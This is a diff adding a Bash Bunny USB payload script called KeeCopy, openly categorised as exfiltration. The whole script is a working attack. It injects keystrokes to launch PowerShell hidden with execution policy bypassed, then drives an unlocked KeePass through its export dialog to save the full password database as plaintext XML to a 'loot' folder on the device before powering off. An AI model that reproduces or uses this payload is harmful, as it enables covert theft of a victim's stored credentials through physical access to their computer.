@@ -1,0 +1,102 @@
+#!/bin/bash
+#
+# Title:         KeeCopy
+# Description:   All-in-one script using keystroke automation to export an unencrypted copy of an unlocked KeePass database.
+#                The database copy is saved to the loot folder on the Bash Bunny USB Mass Storage partition
+# Author:        jrwimmer
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        Windows Vista+ (PowerShell, clip.exe)
+# Attackmodes:   HID, Storage
+#
+#
+
+##################################
+# Options                        #
+##################################
+
+# KEEPASS_SHOW (DUCKY KEY COMBO) - Specify the hot key combination anticipated to show the KeePass window
+KEEPASS_SHOW="CTRL-ALT k"
+
+# KEEPASS_WAITSAVE (MILLISECONDS) - How long to wait for KeePass to complete the export
+KEEPASS_WAITSAVE=5000
+
+# POWEROFF_AFTER (Y/N) - Power down the BashBunny upon completion
+POWEROFF_AFTER="Y"
+
+
+##################################
+# Stage 1: Determine destination #
+##################################
+LED STAGE1
+
+# Activate HID and STORAGE capabilities
+ATTACKMODE HID STORAGE
+
+# Open PowerShell
+RUN WIN powershell.exe
+QUACK DELAY 2000
+
+# Locate the BashBunny volume and store it on the clipboard
+QUACK STRING "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -Command \"(gwmi win32_volume -Filter {label='BashBunny'}).Name\" | clip;exit"
+QUACK ENTER
+
+##################################
+# Stage 2: Export database       #
+##################################
+LED STAGE2
+
+# Open KeePass
+QUACK $KEEPASS_SHOW
+QUACK DELAY 500
+
+# Open the File menu
+QUACK ALT f
+QUACK DELAY 100
+
+# Select "Export"
+QUACK e
+QUACK DELAY 100
+
+# Move focus into the format selector
+QUACK TAB
+QUACK TAB
+
+# Skip down to "Customizable HTML File"
+QUACK c
+
+# Move up to "KeePass XML (2.x)"
+QUACK UP
+
+# Move focus to the Destination File field
+QUACK TAB
+
+# Paste the path copied in STAGE1
+QUACK CTRL v
+
+# Append the rest of the destination path
+QUACK STRING "loot\KPDB-$(date +%Y%m%d-%k%M%S).xml"
+
+# ...and export!
+QUACK ENTER
+
+# Wait for KeePass to complete the export
+QUACK DELAY $KEEPASS_WAITSAVE
+
+##################################
+# Cleanup                        #
+##################################
+LED CLEANUP
+
+# Synchronize disks
+SYNC
+
+##################################
+# Finish                         #
+##################################
+LED FINISH
+
+# Power off
+if [ $POWEROFF_AFTER == "Y" ]; then
+    halt --poweroff
+fi
